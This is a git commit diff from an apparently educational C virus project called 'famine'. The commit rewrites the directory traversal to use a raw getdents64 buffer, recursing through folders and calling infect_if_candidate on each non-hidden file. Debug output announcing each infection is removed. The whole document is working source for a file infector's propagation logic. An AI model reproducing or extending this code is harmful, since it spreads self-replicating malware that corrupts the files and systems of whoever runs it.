d9de6ce73fea23abf090f14e6fbca3a4b0a0deab
spolowy <nelyx@MacBook-Pro-de-Clement.local>
2019-06-07 01:32:55 +0200

    [FIX] getdents64 file recuperation

--- srcs/file_iterator.c
+++ srcs/file_iterator.c
@@ -16,29 +16,39 @@
 #include "utils.h"
 #include "syscall.h"
 
+static void	infect_files_at(char path[PATH_MAX], char *path_end);
+
+static void	browse_dirent(char path[PATH_MAX], char *path_end, \
+			const char buff[1024], int nread)
+{
+	struct dirent64	*file;
+
+	for (int bpos = 0; bpos < nread;)
+	{
+		file = (struct dirent64*)(buff + bpos);
+		ft_strcpy(path_end, file->d_name);
+		if (file->d_name[0] != '.') // we respect your privacy ;)
+		{
+			if (file->d_type == DT_DIR)
+				infect_files_at(path, path_end + ft_strlen(file->d_name));
+			else
+				infect_if_candidate(path);
+		}
+		bpos += file->d_reclen;
+	}
+}
+
 static void	infect_files_at(char path[PATH_MAX], char *path_end)
 {
-	struct dirent64	file;
+	char		buff[1024];
 	int		fd = famine_open(path, O_RDONLY);
+	int		nread;
 
 	if (fd == -1) return;
 
 	ft_strcpy(path_end++, "/");
-
-	while (famine_getdents64(fd, &file, sizeof(file)) > 0)
-	{
-		printf("found: %s in %s\n", file.d_name, path);
-		ft_strcpy(path_end, file.d_name);
-		if (file.d_name[0] == '.') // we respect your privacy ;)
-			continue;
-		else if (file.d_type == DT_DIR)
-			infect_files_at(path, path_end + ft_strlen(file.d_name));
-		else
-		{
-			printf("infect: %s\n", file.d_name);
-			infect_if_candidate(path);
-		}
-	}
+	while ((nread = famine_getdents64(fd, (void*)buff, 1024)) > 0)
+		browse_dirent(path, path_end, buff, nread);
 	famine_close(fd);
 }
 
